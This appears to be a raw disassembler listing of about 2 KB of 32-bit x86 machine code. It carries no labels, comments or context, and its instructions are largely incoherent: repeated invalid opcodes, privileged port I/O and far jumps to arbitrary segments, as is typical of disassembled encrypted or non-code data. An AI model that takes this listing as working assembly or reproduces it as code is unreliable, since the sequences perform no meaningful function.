  40b02b:	mov    al,0x90
  40b02d:	inc    edx
  40b02e:	xor    BYTE PTR [eax+0x66f63db5],ah
  40b034:	xchg   BYTE PTR [ebp-0xc],dl
  40b037:	jo     0x40b09f
  40b039:	jge    0x40affc
  40b03b:	sub    edi,DWORD PTR ds:0xd193faf5
  40b041:	push   0x350b0d11
  40b046:	shr    ebx,cl
  40b048:	push   edi
  40b049:	xor    edx,edx
  40b04b:	push   0x2
  40b04d:	ja     0x40b051
  40b04f:	and    al,0x29
  40b051:	and    eax,0xb34c3269
  40b056:	sbb    al,0x72
  40b058:	ret    
  40b059:	jb     0x40afde
  40b05b:	jne    0x40b08f
  40b05d:	inc    ebx
  40b05e:	call   0xaad05094
  40b063:	mov    eax,es
  40b065:	aaa    
  40b066:	mov    edi,0x9f537770
  40b06b:	push   ds
  40b06c:	sbb    DWORD PTR [edx+eax*1-0x76],edx
  40b070:	test   eax,0xc9b0f753
  40b075:	adc    DWORD PTR [esi],esp
  40b077:	sub    DWORD PTR ss:[edx+0x2208a21c],edx
  40b07e:	(bad)  
  40b07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b080:	xor    al,0xf4
  40b082:	out    dx,eax
  40b083:	sbb    eax,0xf8a270f2
  40b088:	dec    esp
  40b089:	pop    edi
  40b08a:	adc    DWORD PTR [ebx+0x71],0x7c
  40b08e:	xchg   esi,eax
  40b08f:	cli    
  40b090:	adc    edx,DWORD PTR [edx-0x5d]
  40b093:	push   0xffffffcf
  40b095:	not    BYTE PTR [eax-0x7ec008a7]
  40b09b:	xor    ecx,DWORD PTR [edx+0x264f04ea]
  40b0a1:	sbb    bl,ch
  40b0a3:	mov    esi,0xb25c2933
  40b0a8:	lea    esp,[ebx]
  40b0aa:	(bad)  
  40b0ab:	fbld   TBYTE PTR [edi-0x2f]
  40b0ae:	adc    bl,BYTE PTR [esi+edi*8-0x1d]
  40b0b2:	cmp    eax,0x6d7d732
  40b0b7:	mov    al,0xf3
  40b0b9:	xor    BYTE PTR [edx],dh
  40b0bb:	fstp   QWORD PTR [ebp-0x1aee416c]
  40b0c1:	pop    es
  40b0c2:	xchg   edi,eax
  40b0c3:	or     edx,DWORD PTR [edi]
  40b0c5:	ds xor al,0xb1
  40b0c8:	aad    0x9c
  40b0ca:	retf   
  40b0cb:	cmc    
  40b0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0cd:	jo     0x40b09a
  40b0cf:	jg     0x40b0b6
  40b0d1:	mov    al,0x4c
  40b0d3:	add    edx,DWORD PTR [ebx-0x6e61fb94]
  40b0d9:	out    0x6d,al
  40b0db:	mov    WORD PTR [esi-0x7d8d6e7f],ds
  40b0e1:	add    al,0x48
  40b0e3:	mov    bl,0xcf
  40b0e5:	inc    esi
  40b0e6:	pop    ebx
  40b0e7:	(bad)  
  40b0e8:	pop    edx
  40b0e9:	xor    al,0x86
  40b0eb:	lock xchg edi,edx
  40b0ee:	es add eax,0x47af7caf
  40b0f4:	jl     0x40b127
  40b0f6:	out    dx,al
  40b0f7:	cmc    
  40b0f8:	ins    BYTE PTR es:[edi],dx
  40b0f9:	pushf  
  40b0fa:	xor    cl,ch
  40b0fc:	(bad)  
  40b0fd:	aas    
  40b0fe:	dec    edi
  40b0ff:	push   es
  40b100:	pop    ecx
  40b101:	repz add eax,0x2c46b396
  40b107:	js     0x40b0c2
  40b109:	cmp    bl,0x65
  40b10c:	in     al,dx
  40b10d:	xor    bl,BYTE PTR [ebx+ebp*2-0x77]
  40b111:	adc    BYTE PTR [ecx+0x2a],ch
  40b114:	call   0xaebb:0xe2f8b5f4
  40b11b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b11c:	sub    bh,bh
  40b11e:	push   cs
  40b11f:	pop    edx
  40b120:	adc    DWORD PTR [ebx+ebp*2+0x439a0179],ebx
  40b127:	icebp  
  40b128:	adc    DWORD PTR [esi+eax*2],edi
  40b12b:	out    0xb4,al
  40b12d:	jge    0x40b107
  40b12f:	jmp    0x82437f66
  40b134:	adc    esp,ebp
  40b136:	into   
  40b137:	jb     0x40b0f7
  40b139:	fisubr WORD PTR [edx]
  40b13b:	dec    esi
  40b13c:	sbb    al,0x9c
  40b13e:	mov    esi,DWORD PTR [eax-0x12]
  40b141:	pop    esi
  40b142:	xchg   edi,eax
  40b143:	push   si
  40b145:	mov    bh,0xb6
  40b147:	ins    DWORD PTR es:[edi],dx
  40b148:	add    al,0xe5
  40b14a:	imul   edx,DWORD PTR [esi+ebp*4],0xc8fd9aaf
  40b151:	call   DWORD PTR [edx-0x5b]
  40b154:	push   ebx
  40b155:	les    ebx,FWORD PTR [edi-0x6ad8a328]
  40b15b:	xchg   DWORD PTR [ebx-0x25],eax
  40b15e:	and    BYTE PTR [ebp+esi*1+0x35],bl
  40b162:	pushf  
  40b163:	cwde   
  40b164:	scas   eax,DWORD PTR es:[edi]
  40b165:	sub    BYTE PTR [eax+0x4de60730],0x63
  40b16c:	inc    edi
  40b16d:	push   0x60
  40b16f:	sub    al,0x58
  40b171:	push   ebx
  40b172:	or     BYTE PTR [ebx*2+0x456415ee],bl
  40b179:	icebp  
  40b17a:	sbb    BYTE PTR [edi+0x44],dl
  40b17d:	xchg   BYTE PTR [eax],dh
  40b17f:	sub    ecx,DWORD PTR ds:0x5b155097
  40b185:	adc    eax,0xd44362ec
  40b18a:	push   eax
  40b18b:	fstp   TBYTE PTR [ebx]
  40b18d:	aas    
  40b18e:	cmp    al,0xcc
  40b190:	bound  ebx,QWORD PTR [esi-0x76]
  40b193:	loop   0x40b20a
  40b195:	or     al,0xc8
  40b197:	pushf  
  40b198:	arpl   bx,dx
  40b19a:	iret   
  40b19b:	mov    al,ds:0x198bfe9d
  40b1a0:	push   ds
  40b1a1:	mov    WORD PTR [ecx],?
  40b1a3:	fs xchg edx,eax
  40b1a5:	cmp    ebx,DWORD PTR [ebx-0x15]
  40b1a8:	xor    eax,esi
  40b1aa:	xchg   ecx,eax
  40b1ab:	pusha  
  40b1ac:	in     al,dx
  40b1ad:	pop    es
  40b1ae:	mov    edi,0xf6cd4184
  40b1b3:	xchg   DWORD PTR [ebx-0x1],edx
  40b1b6:	pop    ecx
  40b1b7:	in     al,0xd5
  40b1b9:	xchg   ebx,eax
  40b1ba:	ss (bad) 
  40b1bc:	pushf  
  40b1bd:	jae    0x40b155
  40b1bf:	aaa    
  40b1c0:	adc    DWORD PTR [ecx],0x4
  40b1c3:	into   
  40b1c4:	les    eax,FWORD PTR [edi-0x26]
  40b1c7:	js     0x40b228
  40b1c9:	jmp    0x6bfd:0xc395be00
  40b1d0:	int3   
  40b1d1:	push   es
  40b1d2:	cs dec ebx
  40b1d4:	add    DWORD PTR [esi-0x7d21d62f],0x8
  40b1db:	mov    dl,0x8d
  40b1dd:	pop    edi
  40b1de:	adc    BYTE PTR [esi+ebx*2-0x13],bh
  40b1e2:	push   ss
  40b1e3:	push   0x29
  40b1e5:	mov    ah,0x10
  40b1e7:	ret    
  40b1e8:	cwde   
  40b1e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ea:	call   0xe07841c3
  40b1ef:	mov    cl,0xbe
  40b1f1:	jo     0x40b210
  40b1f3:	enter  0x29f2,0x69
  40b1f7:	sbb    al,0x6c
  40b1f9:	fdivr  DWORD PTR [ecx+0x6a]
  40b1fc:	sbb    DWORD PTR [ebx+0x5c6cf79f],0x2e5432b2
  40b206:	pop    edx
  40b207:	mov    bl,0xb6
  40b209:	mov    al,0x59
  40b20b:	repnz out 0x54,ax
  40b20f:	xor    eax,0x720cd56b
  40b214:	repz ja 0x40b268
  40b217:	xor    al,0x14
  40b219:	and    BYTE PTR [ecx],dl
  40b21b:	inc    edi
  40b21c:	sbb    BYTE PTR [eax-0x5fc1c491],bh
  40b222:	leave  
  40b223:	imul   edx,DWORD PTR [eax+0x14],0x5130cee8
  40b22a:	and    ecx,esi
  40b22c:	lock cmp BYTE PTR fs:[edx+0x42],cl
  40b231:	mov    es,WORD PTR [esi-0x64]
  40b234:	adc    BYTE PTR [edi],dl
  40b236:	jo     0x40b252
  40b238:	mov    eax,ds:0x3ba3f097
  40b23d:	sbb    BYTE PTR [ecx-0x80],cl
  40b240:	add    al,ch
  40b242:	mov    ecx,0xd13ff2da
  40b247:	out    dx,eax
  40b248:	mov    esi,ebx
  40b24a:	and    dh,cl
  40b24c:	retf   0xa3e7
  40b24f:	mov    ecx,0x3407d369
  40b254:	adc    BYTE PTR [edx+0x6f271c9c],dl
  40b25a:	jl     0x40b20d
  40b25c:	mov    WORD PTR [eax+0x2aede0d1],?
  40b262:	mov    WORD PTR [edi-0x78],ds
  40b265:	and    al,BYTE PTR [ebp-0x521921e6]
  40b26b:	(bad)  
  40b26c:	jge    0x40b251
  40b26e:	ss (bad) 
  40b270:	adc    DWORD PTR [eax+eiz*1+0x310e3fd5],0x52871646
  40b27b:	inc    esp
  40b27c:	dec    ebx
  40b27d:	or     BYTE PTR [edx+0x44],bl
  40b280:	xor    eax,0x7c08e259
  40b285:	mov    al,0xcf
  40b287:	dec    eax
  40b288:	js     0x40b294
  40b28a:	fdivr  st(0),st
  40b28c:	not    edi
  40b28e:	shr    DWORD PTR [edi],cl
  40b290:	(bad)  
  40b291:	loopne 0x40b2eb
  40b293:	add    dl,BYTE PTR [ecx-0x8a1cefb]
  40b299:	sti    
  40b29a:	sti    
  40b29b:	test   eax,0xb83c4c4a
  40b2a0:	dec    eax
  40b2a1:	retf   
  40b2a2:	lock xchg edi,eax
  40b2a4:	ret    
  40b2a5:	fidiv  WORD PTR [ecx-0x72]
  40b2a8:	lahf   
  40b2a9:	rcr    esi,0x1d
  40b2ac:	rcl    BYTE PTR [edx],0xc6
  40b2af:	lds    edx,FWORD PTR [ecx]
  40b2b1:	pop    edx
  40b2b2:	push   esi
  40b2b3:	mov    ebp,0x8bfe3948
  40b2b8:	loopne 0x40b2b8
  40b2ba:	rol    DWORD PTR [ebp+0x4c],0xc1
  40b2be:	and    DWORD PTR gs:[eax+0x50],edi
  40b2c2:	ds ds jle 0x40b29a
  40b2c6:	dec    esp
  40b2c7:	loope  0x40b2fb
  40b2c9:	xchg   ecx,eax
  40b2ca:	xor    al,0x62
  40b2cc:	pop    ebp
  40b2cd:	lods   eax,DWORD PTR ds:[esi]
  40b2ce:	jae    0x40b2b7
  40b2d0:	out    0x14,al
  40b2d2:	xchg   ebx,eax
  40b2d3:	rcr    DWORD PTR [edi-0x42c3a540],1
  40b2d9:	mov    DWORD PTR [esp+edx*1-0x3],ebp
  40b2dd:	sub    BYTE PTR [eax-0x76],cl
  40b2e0:	or     al,0xfd
  40b2e3:	out    0x58,al
  40b2e5:	sbb    BYTE PTR [ecx-0x2ec2882c],0xd7
  40b2ec:	adc    dl,bl
  40b2ee:	dec    ebx
  40b2ef:	jmp    0x2016:0x1f2fcb53
  40b2f6:	dec    eax
  40b2f7:	lods   al,BYTE PTR ds:[esi]
  40b2f8:	pop    esi
  40b2f9:	lahf   
  40b2fa:	aam    0xa9
  40b2fc:	or     DWORD PTR [esi+0x7b],eax
  40b2ff:	int    0xbf
  40b301:	xor    edx,DWORD PTR [edi]
  40b303:	xor    al,BYTE PTR [esi]
  40b305:	cmp    ebp,DWORD PTR [ecx-0x33e3c310]
  40b30b:	pop    esp
  40b30c:	mov    esp,0x73b2b222
  40b311:	and    eax,0xb0252e44
  40b316:	xchg   edi,eax
  40b317:	cwde   
  40b318:	add    DWORD PTR cs:[esi+0x2ffa0fa1],0xffffffb4
  40b320:	mov    cl,dh
  40b322:	(bad)  
  40b323:	pusha  
  40b324:	inc    ebp
  40b325:	sbb    ch,dl
  40b327:	hlt    
  40b328:	dec    edx
  40b329:	test   eax,0x7d8317be
  40b32e:	enter  0x48e5,0xf5
  40b332:	test   BYTE PTR [ebx-0x3b],ah
  40b335:	jns    0x40b376
  40b337:	mov    ebx,0x16762cc0
  40b33c:	pushf  
  40b33d:	pushf  
  40b33e:	adc    eax,0x72a92c5a
  40b343:	ss and eax,0xcd0512ed
  40b349:	lahf   
  40b34a:	fs inc ecx
  40b34c:	ins    DWORD PTR es:[edi],dx
  40b34d:	dec    edx
  40b34e:	sbb    DWORD PTR [edx+0x35],eax
  40b351:	aas    
  40b352:	sub    BYTE PTR [ebp-0x54],0x5a
  40b356:	ror    ch,1
  40b358:	pop    edx
  40b359:	(bad)  
  40b35a:	int    0xf0
  40b35c:	jmp    0xb68f:0x64941448
  40b363:	sahf   
  40b364:	add    al,0x7e
  40b366:	hlt    
  40b367:	or     eax,0xb70a5779
  40b36c:	scas   al,BYTE PTR es:[edi]
  40b36d:	loope  0x40b3db
  40b36f:	por    mm1,QWORD PTR [ebx-0x6]
  40b373:	mov    ch,0xb3
  40b375:	lock jp 0x40b306
  40b378:	fnstenv [edx+0x36641bcc]
  40b37e:	xchg   ebx,eax
  40b37f:	sahf   
  40b380:	lods   eax,DWORD PTR ds:[esi]
  40b381:	js     0x40b32b
  40b383:	ins    DWORD PTR es:[edi],dx
  40b384:	dec    ecx
  40b385:	cmp    BYTE PTR [ebx*1-0x57090a13],bh
  40b38c:	jmp    0xe82b:0x5b105257
  40b393:	push   esi
  40b394:	mov    bh,0x3
  40b396:	pop    ss
  40b397:	dec    esp
  40b398:	pop    ebx
  40b399:	dec    ebp
  40b39a:	cs xchg ebx,eax
  40b39c:	aad    0x7e
  40b39e:	scas   al,BYTE PTR es:[edi]
  40b39f:	gs sahf 
  40b3a1:	add    DWORD PTR [edi+0x5e360a0f],ebx
  40b3a7:	aam    0x3c
  40b3a9:	fldenv [edi]
  40b3ab:	adc    DWORD PTR [edx],edx
  40b3ad:	mov    ch,0xd7
  40b3af:	dec    edi
  40b3b0:	andnps xmm2,XMMWORD PTR [eax]
  40b3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3b4:	or     al,0xa5
  40b3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b7:	ins    BYTE PTR es:[edi],dx
  40b3b8:	xchg   ebp,eax
  40b3b9:	push   ecx
  40b3ba:	idiv   edx
  40b3bc:	cdq    
  40b3bd:	sub    BYTE PTR [edi],bl
  40b3bf:	pop    ebp
  40b3c0:	mov    ah,0x98
  40b3c2:	push   cs
  40b3c3:	aad    0xc0
  40b3c5:	outs   dx,BYTE PTR ds:[esi]
  40b3c6:	(bad)  
  40b3c8:	dec    ecx
  40b3c9:	sbb    DWORD PTR [bx],edi
  40b3cc:	ror    ah,1
  40b3ce:	rcl    BYTE PTR [esi-0x371b6fa4],1
  40b3d4:	call   0xd20a:0x34339d9f
  40b3db:	mov    ebp,0x455442ed
  40b3e0:	and    DWORD PTR [esi-0xa],esi
  40b3e3:	cmp    ch,ch
  40b3e5:	les    edx,FWORD PTR ds:0xbc0e686c
  40b3eb:	test   eax,0x6c3a57cb
  40b3f0:	mov    dh,0x73
  40b3f2:	xchg   ebx,eax
  40b3f3:	(bad)  
  40b3f4:	das    
  40b3f5:	shl    ah,cl
  40b3f7:	in     eax,dx
  40b3f8:	mov    ebp,0xbc10b962
  40b3fd:	out    0x64,eax
  40b3ff:	push   ebp
  40b400:	fld    TBYTE PTR [edx]
  40b402:	sbb    edx,0x825b2b13
  40b408:	popf   
  40b409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b40a:	adc    ebp,eax
  40b40c:	inc    ebx
  40b40d:	sub    dh,dh
  40b40f:	xchg   ecx,eax
  40b410:	mov    ebx,0x520d63e
  40b415:	aas    
  40b416:	imul   edi,eax,0xffffff96
  40b419:	sahf   
  40b41a:	scas   al,BYTE PTR es:[edi]
  40b41b:	push   cs
  40b41c:	int    0xde
  40b41e:	cmp    DWORD PTR [eax],edi
  40b420:	xor    ebx,DWORD PTR [eax]
  40b422:	jl     0x40b47c
  40b424:	gs sti 
  40b426:	mov    esp,0x4cd66065
  40b42b:	jmp    0x9834:0x6c1db1c2
  40b432:	push   ecx
  40b433:	push   ebp
  40b434:	mov    esp,eax
  40b436:	xchg   ebx,eax
  40b437:	sbb    al,0x85
  40b439:	dec    edx
  40b43a:	mov    edx,0xd1a94035
  40b43f:	jns    0x40b47d
  40b441:	inc    ebp
  40b442:	aad    0x9
  40b444:	jns    0x40b41d
  40b446:	stos   BYTE PTR es:[edi],al
  40b447:	xchg   esi,eax
  40b448:	inc    esi
  40b449:	push   0xb4d53071
  40b44e:	mov    bl,0x7b
  40b450:	mov    cs,WORD PTR [eax-0x433472c4]
  40b456:	and    DWORD PTR [ebp+0x4b76b007],ebp
  40b45c:	ret    
  40b45d:	fnstsw WORD PTR [ebx]
  40b45f:	pop    esp
  40b460:	xchg   edi,eax
  40b461:	sub    esp,edx
  40b463:	dec    edi
  40b464:	fs pop es
  40b466:	xor    eax,0x4e809410
  40b46b:	ror    edx,0x34
  40b46e:	sbb    DWORD PTR [esi+edi*2],esp
  40b471:	inc    ecx
  40b472:	sub    al,0x9d
  40b474:	jae    0x40b412
  40b476:	mov    eax,0x2ac9605
  40b47b:	imul   edi,DWORD PTR [eax+0x4f],0x804c3206
  40b482:	out    dx,eax
  40b483:	ror    dh,0x4b
  40b486:	pop    es
  40b487:	dec    edx
  40b488:	jmp    0x40b4c2
  40b48a:	mov    ebx,0x3a374b8b
  40b48f:	scas   eax,DWORD PTR es:[edi]
  40b490:	or     eax,0x54e1e1dc
  40b495:	(bad)
  40b498:	add    BYTE PTR es:[eax+0x34],ch
  40b49c:	cmp    al,0x32
  40b49f:	test   BYTE PTR [ebx],ah
  40b4a1:	pop    edi
  40b4a2:	rol    cl,cl
  40b4a4:	sub    esp,DWORD PTR [ebx]
  40b4a6:	xchg   ecx,edx
  40b4a8:	xchg   edx,eax
  40b4a9:	pusha  
  40b4aa:	bound  esp,QWORD PTR [ebp-0x3eb5e9ef]
  40b4b0:	popa   
  40b4b1:	xor    eax,0xb5406616
  40b4b6:	inc    edi
  40b4b7:	and    ebx,esi
  40b4b9:	shr    BYTE PTR [edx],cl
  40b4bb:	jl     0x40b4fe
  40b4bd:	test   BYTE PTR [ecx+0x48ebf641],0x38
  40b4c4:	or     esp,DWORD PTR [ebx+eax*4-0x50]
  40b4c8:	stc    
  40b4c9:	fs ins DWORD PTR es:[edi],dx
  40b4cb:	out    0xc8,eax
  40b4cd:	mov    ch,0xae
  40b4cf:	mov    esi,DWORD PTR [ebp-0x6]
  40b4d2:	out    0xd3,al
  40b4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d5:	mov    al,ds:0x6b9fdda0
  40b4da:	sbb    al,0x3b
  40b4dc:	sbb    al,0x80
  40b4de:	pushf  
  40b4df:	pop    edi
  40b4e0:	mov    ebx,0x68648ef1
  40b4e5:	lds    ebx,FWORD PTR [ebp+0x2c472f7]
  40b4eb:	pop    eax
  40b4ec:	xor    eax,0x303fdebc
  40b4f1:	fldcw  WORD PTR [eax+0x59]
  40b4f4:	and    BYTE PTR [eax+0x3a07ef5],ch
  40b4fa:	xchg   edx,eax
  40b4fb:	loop   0x40b4ed
  40b4fd:	(bad)  
  40b4fe:	and    al,0x8b
  40b500:	sub    BYTE PTR [ebp+edx*1+0x427defeb],dl
  40b507:	in     eax,dx
  40b508:	sub    dh,bh
  40b50a:	cmp    edi,DWORD PTR [esi+0x399b6b4]
  40b510:	sbb    al,0x6b
  40b512:	fcomp  QWORD PTR ds:0xa30e99eb
  40b518:	outs   dx,BYTE PTR ds:[esi]
  40b519:	test   al,0xd2
  40b51b:	iret   
  40b51c:	xor    DWORD PTR [ecx+0x6208c71f],0x67
  40b523:	mov    ds:0xce00fb7e,eax
  40b528:	jecxz  0x40b541
  40b52a:	mov    cs,edi
  40b52c:	call   0x2ae8f62a
  40b531:	ret    0x5a95
  40b534:	push   ds
  40b535:	sbb    al,0xea
  40b537:	sub    BYTE PTR [eax+0x2d],0xe6
  40b53b:	sub    eax,0xa5eb3b75
  40b540:	cmp    ebx,DWORD PTR [edx-0x75]
  40b543:	mov    al,0x8b
  40b545:	and    BYTE PTR [edx],0x0
  40b548:	push   ecx
  40b549:	mov    bh,0x82
  40b54b:	aaa    
  40b54c:	dec    ebp
  40b54d:	dec    ebx
  40b54e:	ds repz pushf 
  40b551:	push   ebx
  40b552:	int3   
  40b553:	mov    ah,0x1c
  40b555:	jno    0x40b585
  40b557:	ret    
  40b558:	cmp    bl,dl
  40b55a:	xchg   esi,eax
  40b55b:	aam    0x41
  40b55d:	dec    ebx
  40b55e:	in     al,dx
  40b55f:	mov    ah,0x5f
  40b561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b562:	jle    0x40b55c
  40b564:	cmp    al,0xb
  40b566:	jb     0x40b54b
  40b568:	pop    ebx
  40b569:	in     eax,dx
  40b56a:	enter  0x46c9,0xa2
  40b56e:	adc    BYTE PTR [ecx],cl
  40b570:	push   eax
  40b571:	jg     0x40b53d
  40b573:	clc    
  40b574:	lgs    ebp,FWORD PTR ds:0x22da4727
  40b57b:	add    bl,bl
  40b57d:	sbb    dl,dh
  40b57f:	stos   DWORD PTR es:[edi],eax
  40b580:	ins    DWORD PTR es:[edi],dx
  40b581:	adc    DWORD PTR [esp+ecx*8+0x6a],esp
  40b585:	xchg   DWORD PTR [esi],ebp
  40b587:	push   DWORD PTR [esi-0x108c0fa7]
  40b58d:	test   eax,0x90e276bd
  40b592:	mov    bh,ah
  40b594:	ror    ebx,cl
  40b596:	nop
  40b597:	in     eax,0x44
  40b599:	test   al,0xca
  40b59b:	mov    cl,0xe6
  40b59d:	retf   0xa93b
  40b5a0:	dec    edi
  40b5a1:	mov    bh,bh
  40b5a3:	mov    ds:0xb8f60701,al
  40b5a8:	imul   esi,DWORD PTR [ebp-0x65],0x70ecf2f6
  40b5af:	out    0x24,al
  40b5b1:	stos   DWORD PTR es:[edi],eax
  40b5b2:	sub    DWORD PTR [edx+0x8e4827],edx
  40b5b8:	imul   edx,DWORD PTR [eax-0x30df534a],0xc56fdea2
  40b5c2:	ins    BYTE PTR es:[edi],dx
  40b5c3:	imul   esi,ecx,0x10971778
  40b5c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ca:	mov    bh,BYTE PTR [edx-0x78ed9e8b]
  40b5d0:	aaa    
  40b5d1:	inc    edx
  40b5d2:	fdivr  DWORD PTR [ebx+0x59ac52ff]
  40b5d8:	cmp    ah,dh
  40b5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5db:	adc    al,BYTE PTR [ebx]
  40b5dd:	sub    eax,0xaf0765c7
  40b5e2:	sub    al,BYTE PTR [edx+0x4e]
  40b5e5:	lds    edi,FWORD PTR [edx-0x4a]
  40b5e8:	outs   dx,BYTE PTR ds:[esi]
  40b5e9:	sbb    eax,0x8121d7bb
  40b5ee:	ret    0x73e2
  40b5f1:	and    ch,dh
  40b5f3:	lahf   
  40b5f4:	mov    edx,0xdbd2b46c
  40b5f9:	jge    0x40b586
  40b5fb:	jg     0x40b635
  40b5fd:	(bad)  
  40b600:	mov    bh,0x97
  40b602:	lock jno 0x40b683
  40b605:	jle    0x40b628
  40b607:	and    ecx,ebp
  40b609:	dec    eax
  40b60a:	jno    0x40b63e
  40b60c:	sbb    esi,DWORD PTR [esi+0x52de54c]
  40b612:	pop    ds
  40b613:	xor    al,0x4c
  40b615:	mov    edx,0xf92fe886
  40b61a:	sub    edi,edx
  40b61c:	das    
  40b61d:	leave  
  40b61e:	xor    al,dl
  40b620:	popf   
  40b621:	mov    esi,0x15d569a7
  40b626:	into   
  40b627:	mov    WORD PTR [esi-0x23],?
  40b62a:	shl    BYTE PTR ds:0x23ba6bfc,1
  40b630:	lods   eax,DWORD PTR ds:[esi]
  40b631:	adc    DWORD PTR [ecx+edi*8],ecx
  40b634:	test   al,0xf3
  40b636:	xor    DWORD PTR ds:0xc939072f,esi
  40b63c:	dec    esi
  40b63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b63e:	in     eax,dx
  40b63f:	mov    bl,0x6
  40b641:	ror    DWORD PTR [ebx-0x3d],1
  40b644:	adc    dh,BYTE PTR [esi]
  40b646:	ins    BYTE PTR es:[edi],dx
  40b647:	out    dx,eax
  40b648:	out    dx,al
  40b649:	push   edx
  40b64a:	jae    0x40b5f8
  40b64c:	in     eax,0x21
  40b64e:	or     DWORD PTR [ebp+0x13],ecx
  40b651:	jmp    0x7839:0x426b4f13
  40b658:	jns    0x40b66f
  40b65a:	popf   
  40b65b:	fbld   TBYTE PTR [ebp+0x6e]
  40b65e:	jg     0x40b656
  40b660:	stos   DWORD PTR es:[edi],eax
  40b661:	(bad)  
  40b662:	test   al,0x4b
  40b664:	jmp    0x45c6b9f8
  40b669:	pop    ebx
  40b66a:	es mov ch,0xf4
  40b66d:	sub    DWORD PTR [ebx],ecx
  40b66f:	bound  ebx,QWORD PTR [esi]
  40b671:	out    dx,al
  40b672:	sbb    edi,eax
  40b674:	lea    ebx,[ebx+esi*1-0x3d]
  40b678:	cmp    BYTE PTR [edx],dh
  40b67a:	scas   eax,DWORD PTR es:[edi]
  40b67b:	call   0x4eb0:0x12dc1cc1
  40b682:	mov    edx,0x10130640
  40b687:	push   edx
  40b688:	shl    DWORD PTR [edx],1
  40b68a:	into   
  40b68b:	clc    
  40b68c:	xchg   DWORD PTR [ebp-0x77ede636],edx
  40b692:	pop    edx
  40b693:	or     esi,DWORD PTR [esi+0x5567b642]
  40b699:	es imul ebp,eax,0x8
  40b69d:	enter  0x1134,0xf6
  40b6a1:	pop    es
  40b6a2:	push   ebx
  40b6a3:	dec    edx
  40b6a4:	push   esp
  40b6a5:	add    edi,DWORD PTR [edi+ebx*1+0x52]
  40b6a9:	pushf  
  40b6aa:	fwait
  40b6ab:	je     0x40b6ff
  40b6ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6ae:	outs   dx,DWORD PTR ds:[esi]
  40b6af:	pop    edx
  40b6b0:	cli    
  40b6b1:	sub    dh,BYTE PTR [edx]
  40b6b3:	and    eax,0x9ee2408e
  40b6b8:	mov    esp,0xfdf2365c
  40b6bd:	xchg   esi,eax
  40b6be:	xor    BYTE PTR ds:0xbf712eed,al
  40b6c4:	add    edi,DWORD PTR [ebx]
  40b6c6:	adc    dl,bh
  40b6c8:	ficom  DWORD PTR [edi+0x11]
  40b6cb:	or     al,0x7
  40b6cd:	or     ecx,DWORD PTR [ecx-0x46]
  40b6d0:	aam    0x13
  40b6d2:	adc    DWORD PTR [esi-0x64],edi
  40b6d5:	jl     0x40b727
  40b6d7:	pop    ecx
  40b6d8:	adc    esi,ecx
  40b6da:	cmp    al,0x49
  40b6dc:	test   BYTE PTR [edi+0x512c2f95],ch
  40b6e2:	cdq    
  40b6e3:	adc    al,0xeb
  40b6e5:	pop    edx
  40b6e6:	retf   
  40b6e7:	push   ebx
  40b6e8:	into   
  40b6e9:	ret    
  40b6ea:	cmp    al,0x4c
  40b6ec:	into   
  40b6ed:	mov    BYTE PTR [ebp+0x391b97fe],al
  40b6f3:	aaa    
  40b6f4:	dec    edi
  40b6f5:	rcr    DWORD PTR [esi],0x83
  40b6f8:	sbb    ch,BYTE PTR [edx]
  40b6fa:	js     0x40b6d9
  40b6fc:	mov    esi,0xc6df3e05
  40b701:	sub    al,0xb2
  40b703:	xchg   edi,eax
  40b704:	mov    bl,BYTE PTR [edi-0xcb1d112]
  40b70a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b70b:	fld    DWORD PTR [edx+0x65]
  40b70e:	es sbb eax,0x54fb00ec
  40b714:	(bad)  
  40b715:	repz inc edi
  40b717:	sbb    al,0xda
  40b719:	push   ds
  40b71a:	or     BYTE PTR [ecx],bl
  40b71c:	mov    esp,0x2d84927d
  40b721:	leave  
  40b722:	(bad)  
  40b723:	pop    ds
  40b724:	mov    al,ds:0x1e998721
  40b729:	and    cl,BYTE PTR [ebx-0x43bef5]
  40b72f:	stos   BYTE PTR es:[edi],al
  40b730:	cwde   
  40b731:	mov    ds:0xc03c0a50,al
  40b736:	mov    edi,0x51377e8
  40b73b:	or     DWORD PTR [edx-0x18b2875f],esp
  40b741:	push   esp
  40b742:	mov    al,0x48
  40b744:	or     DWORD PTR [edi+0x77],ecx
  40b747:	fcomp  DWORD PTR [ebx-0x2fac591b]
  40b74d:	es iret 
  40b74f:	scas   al,BYTE PTR es:[edi]
  40b750:	hlt    
  40b751:	ins    DWORD PTR es:[edi],dx
  40b752:	or     BYTE PTR [edi-0x5b04f82c],bh
  40b758:	sub    ah,BYTE PTR [eax]
  40b75a:	(bad)  
  40b75b:	fldenv [edx+ebx*8]
  40b75e:	or     ebp,DWORD PTR [ebp-0x49e9fd78]
  40b764:	inc    edi
  40b765:	sbb    al,0x34
  40b767:	push   eax
  40b768:	sub    al,0x88
  40b76a:	jae    0x40b7e0
  40b76c:	push   ebp
  40b76d:	and    eax,DWORD PTR [esi+eiz*8]
  40b770:	into   
  40b771:	pusha  
  40b772:	xor    al,0x1c
  40b774:	push   0x2b873332
  40b779:	sub    DWORD PTR [esp+eax*4],ebx
  40b77c:	int    0xff
  40b77e:	stc    
  40b77f:	addr16 (bad) 
  40b781:	mov    ch,0x59
  40b783:	outs   dx,BYTE PTR ds:[esi]
  40b784:	jb     0x40b7a7
  40b786:	loope  0x40b76e
  40b788:	fwait
  40b789:	int    0xd1
  40b78b:	and    DWORD PTR [ebp+0x3409d78b],edx
  40b791:	add    BYTE PTR [ebx+0x62],dl
  40b794:	cmp    BYTE PTR fs:[edi-0x5b],0x83
  40b799:	nop
  40b79a:	cmp    ebx,edi
  40b79c:	lock loopne 0x40b722
  40b79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
